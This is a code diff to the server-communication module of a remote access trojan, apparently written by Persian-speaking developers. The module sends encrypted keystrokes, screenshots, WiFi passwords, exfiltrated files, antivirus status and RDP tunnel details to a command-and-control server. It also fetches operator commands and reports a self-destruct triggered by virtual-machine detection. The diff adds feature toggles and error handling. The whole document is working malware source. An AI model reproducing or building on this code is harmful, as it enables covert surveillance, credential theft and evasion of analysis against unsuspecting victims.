@@ -8,16 +8,6 @@ import gzip
 import base64
 from rat_config import Config
 
-# Always enable INFO logging, DEBUG if enabled
-logging.basicConfig(
-    level=logging.DEBUG if Config.DEBUG_MODE else logging.INFO,
-    format='[%(asctime)s] %(levelname)s: %(message)s',
-    handlers=[
-        logging.FileHandler(Config.ERROR_LOG_FILE),
-        logging.StreamHandler()
-    ]
-)
-
 class ServerCommunicator:
     def __init__(self, client_id, encryption_manager):
         self.client_id = client_id
@@ -29,14 +19,41 @@ class ServerCommunicator:
             "http": Config.PROXY_HTTP,
             "https": Config.PROXY_HTTPS
         } if Config.PROXY_HTTP or Config.PROXY_HTTPS else None
+        
+        # Setup logging for this module
+        self.logger = logging.getLogger("ServerCommunicator")
 
     def _send_request(self, action: str, data: Dict = None, files=None):
+        """ارسال درخواست به سرور"""
+        if not Config.ENABLE_COMMAND_HANDLER and action != "check_version":
+            self.logger.info(f"Command handler disabled, skipping request: {action}")
+            return []
+    
         try:
             url = self.server_url
             payload = {'action': action}
+            
+            # مدیریت داده‌ها
             if data:
-                payload.update(data)
-            logging.info(f"Sending request to {url} with action={action}, data_keys={list(payload.keys()) if payload else None}, files={files is not None}, proxies={self.proxies}")
+                if isinstance(data, dict):
+                    payload.update(data)
+                else:
+                    self.logger.warning(f"Data is not a dictionary: {type(data)}")
+                    # تبدیل به دیکشنری اگر ممکن است
+                    try:
+                        if hasattr(data, '__dict__'):
+                            payload.update(data.__dict__)
+                        else:
+                            payload['raw_data'] = str(data)
+                    except Exception as e:
+                        self.logger.error(f"Failed to process data: {str(e)}")
+            
+            self.logger.info(f"Sending request to {url} with action={action}, data_keys={list(payload.keys()) if payload else None}, files={files is not None}")
+            
+            # تنظیم timeout پویا بر اساس نوع action
+            timeout = Config.COMMAND_TIMEOUT
+            if files or action in ["upload_data", "upload_file", "report_rdp_tunnel"]:
+                timeout = 30  # timeout بیشتر برای آپلود فایل‌های حجیم
             
             if files:
                 response = requests.post(
@@ -44,7 +61,7 @@ class ServerCommunicator:
                     data=payload,
                     files=files,
                     verify=False,
-                    timeout=Config.COMMAND_TIMEOUT,
+                    timeout=timeout,
                     proxies=self.proxies
                 )
             else:
@@ -52,23 +69,47 @@ class ServerCommunicator:
                     url,
                     json=payload,
                     verify=False,
-                    timeout=Config.COMMAND_TIMEOUT,
+                    timeout=timeout,
                     proxies=self.proxies
                 )
+            
             return self._handle_response(response)
+            
+        except requests.exceptions.Timeout:
+            error_msg = f"Request timeout for action {action} (timeout: {timeout}s)"
+            self.logger.error(error_msg)
+            raise CommunicationError(error_msg)
+            
+        except requests.exceptions.ConnectionError:
+            error_msg = f"Connection error for action {action}"
+            self.logger.error(error_msg)
+            raise CommunicationError(error_msg)
+            
         except requests.exceptions.RequestException as e:
-            logging.error(f"Connection error: {str(e)}")
-            raise CommunicationError(f"Connection error: {str(e)}")
+            error_msg = f"Request error for action {action}: {str(e)}"
+            self.logger.error(error_msg)
+            raise CommunicationError(error_msg)
+            
+        except Exception as e:
+            error_msg = f"Unexpected error in _send_request for action {action}: {str(e)}"
+            self.logger.error(error_msg)
+            raise CommunicationError(error_msg)
 
     def check_version(self) -> Dict:
+        """بررسی نسخه جدید"""
+        if not Config.ENABLE_AUTO_UPDATE:
+            self.logger.info("Auto-update disabled, skipping version check")
+            return {"current_version": Config.CLIENT_VERSION, "message": "Auto-update disabled"}
+
         try:
-            logging.info(f"Checking for updates: client_id={self.client_id}")
+            self.logger.info(f"Checking for updates: client_id={self.client_id}")
             data = {
                 "action": "check_version",
                 "client_id": self.client_id,
                 "token": self.token
             }
-            logging.info(f"Sending version check request to {self.version_url}: {data}")
+            
+            self.logger.info(f"Sending version check request to {self.version_url}")
             response = requests.post(
                 self.version_url,
                 json=data,
@@ -77,27 +118,36 @@ class ServerCommunicator:
                 proxies=self.proxies
             )
             response.raise_for_status()
-            logging.info(f"Version check response: status={response.status_code}, text={response.text}")
+            
+            self.logger.info(f"Version check response: status={response.status_code}")
             return response.json()
+            
         except requests.exceptions.RequestException as e:
-            logging.error(f"Version check error: {str(e)}")
+            self.logger.error(f"Version check error: {str(e)}")
             return {"error": f"Version check failed: {str(e)}"}
         except json.JSONDecodeError:
-            logging.error("Invalid JSON response from version check")
+            self.logger.error("Invalid JSON response from version check")
             return {"error": "Invalid JSON response"}
 
     def report_rdp_tunnel(self, tunnel_info: Dict) -> Dict:
+        """گزارش وضعیت RDP"""
+        if not Config.ENABLE_RDP_CONTROL:
+            self.logger.info("RDP control disabled, skipping tunnel report")
+            return {"status": "skipped", "message": "RDP control disabled"}
+
         try:
-            logging.info(f"Preparing RDP tunnel report: client_id={self.client_id}")
+            self.logger.info(f"Preparing RDP tunnel report: client_id={self.client_id}")
             tunnel_info_json = json.dumps(tunnel_info, ensure_ascii=False)
             encrypted_tunnel_info = self.encryption.encrypt(tunnel_info_json)
+            
             encrypted_data = {
                 "action": "report_rdp_tunnel",
                 "client_id": self.client_id,
                 "token": self.token,
                 "tunnel_info": encrypted_tunnel_info
             }
-            logging.info(f"Sending RDP tunnel report: {encrypted_data}")
+            
+            self.logger.info("Sending RDP tunnel report")
             response = requests.post(
                 self.server_url,
                 json=encrypted_data,
@@ -106,21 +156,29 @@ class ServerCommunicator:
                 proxies=self.proxies
             )
             response.raise_for_status()
-            logging.info("RDP tunnel report sent successfully")
+            
+            self.logger.info("RDP tunnel report sent successfully")
             return response.json()
+            
         except Exception as e:
-            logging.error(f"RDP tunnel report error: {str(e)}")
+            self.logger.error(f"RDP tunnel report error: {str(e)}")
             raise CommunicationError(f"RDP tunnel report error: {str(e)}")
 
     def report_update(self, new_version: str) -> Dict:
+        """گزارش بروزرسانی"""
+        if not Config.ENABLE_AUTO_UPDATE:
+            self.logger.info("Auto-update disabled, skipping update report")
+            return {"status": "skipped", "message": "Auto-update disabled"}
+
         try:
-            logging.info(f"Preparing update report: client_id={self.client_id}, new_version={new_version}")
+            self.logger.info(f"Preparing update report: client_id={self.client_id}, new_version={new_version}")
             report_data = {
                 "message": f"Updated to version {new_version}",
                 "client_id": self.client_id,
                 "new_version": new_version,
                 "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
             }
+            
             encrypted_report = self.encryption.encrypt(json.dumps(report_data, ensure_ascii=False))
             encrypted_data = {
                 "action": "report_update",
@@ -128,7 +186,8 @@ class ServerCommunicator:
                 "token": self.token,
                 "report": encrypted_report
             }
-            logging.info(f"Sending update report: {encrypted_data}")
+            
+            self.logger.info("Sending update report")
             response = requests.post(
                 self.server_url,
                 json=encrypted_data,
@@ -137,24 +196,33 @@ class ServerCommunicator:
                 proxies=self.proxies
             )
             response.raise_for_status()
-            logging.info("Update report sent successfully")
+            
+            self.logger.info("Update report sent successfully")
             return response.json()
+            
         except Exception as e:
-            logging.error(f"Update report error: {str(e)}")
+            self.logger.error(f"Update report error: {str(e)}")
             raise CommunicationError(f"Update report error: {str(e)}")
 
     def upload_vm_status(self, vm_details: Dict) -> Dict:
+        """آپلود وضعیت VM"""
+        if not Config.ENABLE_VM_DETECTION:
+            self.logger.info("VM detection disabled, skipping status upload")
+            return {"status": "skipped", "message": "VM detection disabled"}
+
         try:
-            logging.info(f"Preparing VM status upload: client_id={self.client_id}")
+            self.logger.info(f"Preparing VM status upload: client_id={self.client_id}")
             vm_details_json = json.dumps(vm_details, ensure_ascii=False)
             encrypted_vm_details = self.encryption.encrypt(vm_details_json)
+            
             encrypted_data = {
                 "action": "upload_vm_status",
                 "client_id": self.client_id,
                 "token": self.token,
                 "vm_details": encrypted_vm_details
             }
-            logging.info(f"Sending upload_vm_status: {encrypted_data}")
+            
+            self.logger.info("Sending VM status")
             response = requests.post(
                 self.server_url,
                 json=encrypted_data,
@@ -163,24 +231,33 @@ class ServerCommunicator:
                 proxies=self.proxies
             )
             response.raise_for_status()
-            logging.info("VM status upload successful")
+            
+            self.logger.info("VM status upload successful")
             return response.json()
+            
         except Exception as e:
-            logging.error(f"VM status upload error: {str(e)}")
+            self.logger.error(f"VM status upload error: {str(e)}")
             raise CommunicationError(f"VM status upload error: {str(e)}")
 
     def upload_antivirus_status(self, antivirus_data: Dict) -> Dict:
+        """آپلود وضعیت آنتی‌ویروس"""
+        if not Config.ENABLE_ANTIVIRUS_DETECTION:
+            self.logger.info("Antivirus detection disabled, skipping status upload")
+            return {"status": "skipped", "message": "Antivirus detection disabled"}
+
         try:
-            logging.info(f"Antivirus status upload: client_id={self.client_id}")
+            self.logger.info(f"Antivirus status upload: client_id={self.client_id}")
             antivirus_data_json = json.dumps(antivirus_data, ensure_ascii=False)
             encrypted_antivirus_data = self.encryption.encrypt(antivirus_data_json)
+            
             encrypted_data = {
                 "action": "upload_antivirus_status",
                 "client_id": self.client_id,
                 "token": self.token,
                 "antivirus_data": encrypted_antivirus_data
             }
-            logging.info(f"Sending antivirus status: {encrypted_data}")
+            
+            self.logger.info("Sending antivirus status")
             response = requests.post(
                 self.server_url,
                 json=encrypted_data,
@@ -189,20 +266,25 @@ class ServerCommunicator:
                 proxies=self.proxies
             )
             response.raise_for_status()
-            logging.info("Antivirus status upload successful")
+            
+            self.logger.info("Antivirus status upload successful")
             return response.json()
+            
         except Exception as e:
-            logging.error(f"Antivirus status upload error: {str(e)}")
+            self.logger.error(f"Antivirus status upload error: {str(e)}")
             raise CommunicationError(f"Antivirus status upload error: {str(e)}")
 
     def report_self_destruct(self) -> Dict:
+        """گزارش self-destruct"""
         try:
-            logging.info(f"Preparing self-destruct report: client_id={self.client_id}")
+            self.logger.info(f"Preparing self-destruct report: client_id={self.client_id}")
             report_data = {
-                "message": "Self-destruct initiated due to critical error",
+                "message": "Self-destruct initiated",
                 "client_id": self.client_id,
-                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
+                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
+                "reason": "VM detection or critical error"
             }
+            
             encrypted_report = self.encryption.encrypt(json.dumps(report_data, ensure_ascii=False))
             encrypted_data = {
                 "action": "report_self_destruct",
@@ -210,7 +292,8 @@ class ServerCommunicator:
                 "token": self.token,
                 "report": encrypted_report
             }
-            logging.info(f"Sending self-destruct report: {encrypted_data}")
+            
+            self.logger.info("Sending self-destruct report")
             response = requests.post(
                 self.server_url,
                 json=encrypted_data,
@@ -219,51 +302,70 @@ class ServerCommunicator:
                 proxies=self.proxies
             )
             response.raise_for_status()
-            logging.info("Self-destruct report sent successfully")
+            
+            self.logger.info("Self-destruct report sent successfully")
             return response.json()
+            
         except Exception as e:
-            logging.error(f"Self-destruct report error: {str(e)}")
+            self.logger.error(f"Self-destruct report error: {str(e)}")
             return {"error": f"Self-destruct report error: {str(e)}"}
 
     def _handle_response(self, response):
-        logging.info(f"Received response: status={response.status_code}, text={response.text[:100]}...")
+        """پردازش پاسخ سرور"""
+        self.logger.info(f"Received response: status={response.status_code}")
+        
         if response.status_code == 200:
             try:
                 data = response.json()
                 if not isinstance(data, dict) or 'commands' not in data:
-                    logging.error("Invalid response format: Missing 'commands' key")
+                    self.logger.error("Invalid response format: Missing 'commands' key")
                     raise CommunicationError("Invalid response format: Missing 'commands' key")
                 if not isinstance(data['commands'], list):
-                    logging.error("Invalid commands format: Expected list")
+                    self.logger.error("Invalid commands format: Expected list")
                     raise CommunicationError("Invalid commands format: Expected list")
                 return data['commands']
             except json.JSONDecodeError:
-                logging.error("Invalid JSON response")
+                self.logger.error("Invalid JSON response")
                 raise CommunicationError("Invalid JSON response")
         else:
-            logging.error(f"Server error: {response.status_code}, response: {response.text}")
+            self.logger.error(f"Server error: {response.status_code}")
             raise CommunicationError(f"Server error: {response.status_code}")
 
     def upload_data(self, keystrokes, system_info, screenshot=None):
+        """آپلود داده‌های کیلاگر"""
+        if not Config.ENABLE_KEYLOGGING:
+            self.logger.info("Keylogging disabled, skipping data upload")
+            return {"status": "skipped", "message": "Keylogging disabled"}
+
         try:
+            # اعتبارسنجی و مقداردهی پیش‌فرض مناسب
             if not keystrokes or not isinstance(keystrokes, list):
-                logging.warning("Keystrokes is empty or not a list")
-                keystrokes = ['']
+                self.logger.debug("Keystrokes is empty, using default")
+                keystrokes = []
+
             if not system_info or not isinstance(system_info, dict):
-                logging.warning("System_info is empty or not a dict")
-                system_info = {'error': 'No system info provided'}
+                self.logger.debug("System_info is empty, using default")
+                system_info = {'info': 'No system info available'}
+
+            # آماده‌سازی داده‌ها
             keystrokes_str = ' '.join(str(k) for k in keystrokes if k)
             system_info_json = json.dumps(system_info, ensure_ascii=False)
-            logging.info(f"Preparing upload: client_id={self.client_id}, keystrokes_len={len(keystrokes_str)}, system_info_len={len(system_info_json)}")
+            
+            self.logger.info(f"Preparing upload: client_id={self.client_id}, keystrokes_len={len(keystrokes_str)}")
+            
+            # رمزنگاری
             try:
                 encrypted_keystrokes = self.encryption.encrypt(keystrokes_str)
                 encrypted_system_info = self.encryption.encrypt(system_info_json)
             except Exception as e:
-                logging.error(f"Encryption failed: {str(e)}")
+                self.logger.error(f"Encryption failed: {str(e)}")
                 raise CommunicationError(f"Encryption failed: {str(e)}")
+
             if not encrypted_keystrokes or not encrypted_system_info:
-                logging.error("Encryption produced empty output")
+                self.logger.error("Encryption produced empty output")
                 raise CommunicationError("Encryption produced empty output")
+
+            # ایجاد درخواست
             encrypted_data = {
                 "action": "upload_data",
                 "client_id": self.client_id,
@@ -271,10 +373,13 @@ class ServerCommunicator:
                 "keystrokes": encrypted_keystrokes,
                 "system_info": encrypted_system_info
             }
+
             files = {}
-            if screenshot:
+            if screenshot and Config.ENABLE_SCREENSHOTS:
                 files['screenshot'] = ('screenshot.png', screenshot, 'image/png')
-                logging.info("Including screenshot in upload")
+                self.logger.info("Including screenshot in upload")
+
+            # ارسال درخواست
             if files:
                 response = requests.post(
                     self.server_url,
@@ -292,16 +397,23 @@ class ServerCommunicator:
                     verify=False,
                     proxies=self.proxies
                 )
+                
             response.raise_for_status()
-            logging.info("Upload successful")
+            self.logger.info("Upload successful")
             return response.json()
+            
         except Exception as e:
-            logging.error(f"Upload error: {str(e)}")
+            self.logger.error(f"Upload error: {str(e)}")
             raise CommunicationError(f"Upload error: {str(e)}")
 
     def fetch_commands(self):
+        """دریافت دستورات از سرور"""
+        if not Config.ENABLE_COMMAND_HANDLER:
+            self.logger.info("Command handler disabled, skipping command fetch")
+            return []
+
         try:
-            logging.info("Fetching commands...")
+            self.logger.info("Fetching commands...")
             response = self._send_request(
                 "get_commands",
                 data={
@@ -309,15 +421,17 @@ class ServerCommunicator:
                     "token": self.token
                 }
             )
-            logging.info(f"Raw commands received: {response}")
+
             validated_commands = []
             for cmd in response:
                 if not all(k in cmd for k in ('id', 'command')):
-                    logging.warning(f"Skipping invalid command: {cmd}")
+                    self.logger.warning(f"Skipping invalid command: {cmd}")
                     continue
+                    
                 try:
                     decrypted = self.encryption.decrypt(cmd['command'])
-                    logging.info(f"Decrypted command: {decrypted}")
+                    self.logger.info(f"Decrypted command: {decrypted}")
+                    
                     if decrypted.startswith('/'):
                         command_type = decrypted.strip('/')
                         params = {}
@@ -325,36 +439,49 @@ class ServerCommunicator:
                         command_data = json.loads(decrypted)
                         command_type = command_data.get('type')
                         params = command_data.get('params', {})
-                    logging.info(f"Parsed command data: type={command_type}, params={params}")
+                    
+                    self.logger.info(f"Parsed command data: type={command_type}")
+                    
                     if not command_type:
-                        logging.error(f"Command missing 'type': {decrypted}")
+                        self.logger.error(f"Command missing 'type': {decrypted}")
                         continue
+
                     validated_commands.append({
                         'id': cmd['id'],
                         'command': cmd['command'],
                         'type': command_type,
                         'params': params
                     })
+                    
                 except Exception as e:
-                    logging.error(f"Command validation failed: {str(e)}, command={cmd}")
-            logging.info(f"Validated commands: {validated_commands}")
+                    self.logger.error(f"Command validation failed: {str(e)}, command={cmd}")
+
+            self.logger.info(f"Validated {len(validated_commands)} commands")
             return validated_commands
+            
         except Exception as e:
-            logging.error(f"Failed to fetch commands: {str(e)}")
+            self.logger.error(f"Failed to fetch commands: {str(e)}")
             raise CommunicationError(f"Failed to process commands: {str(e)}")
 
     def upload_wifi_passwords(self, wifi_data: Dict) -> Dict:
+        """آپلود پسوردهای WiFi"""
+        if not Config.ENABLE_WIFI_PASSWORD_EXTRACTION:
+            self.logger.info("WiFi password extraction disabled, skipping upload")
+            return {"status": "skipped", "message": "WiFi password extraction disabled"}
+
         try:
-            logging.info(f"Preparing Wi-Fi passwords upload: client_id={self.client_id}")
+            self.logger.info(f"Preparing Wi-Fi passwords upload: client_id={self.client_id}")
             wifi_data_json = json.dumps(wifi_data, ensure_ascii=False)
             encrypted_wifi_data = self.encryption.encrypt(wifi_data_json)
+            
             encrypted_data = {
                 "action": "upload_wifi_passwords",
                 "client_id": self.client_id,
                 "token": self.token,
                 "wifi_data": encrypted_wifi_data
             }
-            logging.info(f"Sending Wi-Fi passwords: {encrypted_data}")
+            
+            self.logger.info("Sending Wi-Fi passwords")
             response = requests.post(
                 self.server_url,
                 json=encrypted_data,
@@ -363,18 +490,27 @@ class ServerCommunicator:
                 proxies=self.proxies
             )
             response.raise_for_status()
-            logging.info("Wi-Fi passwords upload successful")
+            
+            self.logger.info("Wi-Fi passwords upload successful")
             return response.json()
+            
         except Exception as e:
-            logging.error(f"Wi-Fi passwords upload error: {str(e)}")
+            self.logger.error(f"Wi-Fi passwords upload error: {str(e)}")
             raise CommunicationError(f"Wi-Fi passwords upload error: {str(e)}")
 
     def send_command_result(self, command_id, result):
+        """ارسال نتیجه اجرای دستور"""
+        if not Config.ENABLE_COMMAND_HANDLER:
+            self.logger.info("Command handler disabled, skipping result send")
+            return {"status": "skipped", "message": "Command handler disabled"}
+
         try:
-            logging.info(f"Sending command result for command_id: {command_id}")
+            self.logger.info(f"Sending command result for command_id: {command_id}")
+            
+            # فشرده‌سازی و رمزنگاری نتیجه
             compressed_result = gzip.compress(json.dumps(result).encode())
             encrypted_result = self.encryption.encrypt(base64.b64encode(compressed_result).decode())
-            logging.info(f"Encrypted result: {encrypted_result[:50]}...")
+            
             data = {
                 'action': 'command_response',
                 'client_id': self.client_id,
@@ -382,6 +518,7 @@ class ServerCommunicator:
                 'result': encrypted_result,
                 'token': self.token
             }
+            
             response = requests.post(
                 self.server_url,
                 json=data,
@@ -391,15 +528,23 @@ class ServerCommunicator:
                 proxies=self.proxies
             )
             response.raise_for_status()
-            logging.info(f"Received response: {response.status_code}")
+            
+            self.logger.info(f"Command result sent successfully: {response.status_code}")
             return response.json()
+            
         except Exception as e:
-            logging.error(f"Failed to send command result: {str(e)}")
+            self.logger.error(f"Failed to send command result: {str(e)}")
             raise CommunicationError(f"Failed to send command result: {str(e)}")
 
     def upload_file(self, file_data: Dict) -> Dict:
+        """آپلود فایل"""
+        if not Config.ENABLE_FILE_MANAGEMENT:
+            self.logger.info("File management disabled, skipping file upload")
+            return {"status": "skipped", "message": "File management disabled"}
+
         try:
-            logging.info(f"Preparing file upload: client_id={self.client_id}, filename={file_data['filename']}")
+            self.logger.info(f"Preparing file upload: client_id={self.client_id}, filename={file_data['filename']}")
+            
             files = {
                 "file": (file_data["filename"], file_data["content"], "application/octet-stream")
             }
@@ -409,7 +554,8 @@ class ServerCommunicator:
                 "token": self.token,
                 "timestamp": file_data["timestamp"]
             }
-            logging.info(f"Sending file upload request: {data}")
+            
+            self.logger.info("Sending file upload request")
             response = requests.post(
                 self.server_url,
                 data=data,
@@ -419,11 +565,25 @@ class ServerCommunicator:
                 proxies=self.proxies
             )
             response.raise_for_status()
-            logging.info(f"File uploaded successfully: {file_data['filename']}")
+            
+            self.logger.info(f"File uploaded successfully: {file_data['filename']}")
             return response.json()
+            
         except Exception as e:
-            logging.error(f"File upload error: {str(e)}")
+            self.logger.error(f"File upload error: {str(e)}")
             raise CommunicationError(f"File upload error: {str(e)}")
 
+    def get_communication_status(self):
+        """دریافت وضعیت ارتباط"""
+        return {
+            "server_url": self.server_url,
+            "client_id": self.client_id,
+            "command_handler_enabled": Config.ENABLE_COMMAND_HANDLER,
+            "auto_update_enabled": Config.ENABLE_AUTO_UPDATE,
+            "keylogging_enabled": Config.ENABLE_KEYLOGGING,
+            "proxies_configured": self.proxies is not None
+        }
+
 class CommunicationError(Exception):
+    """خطای ارتباط با سرور"""
     pass
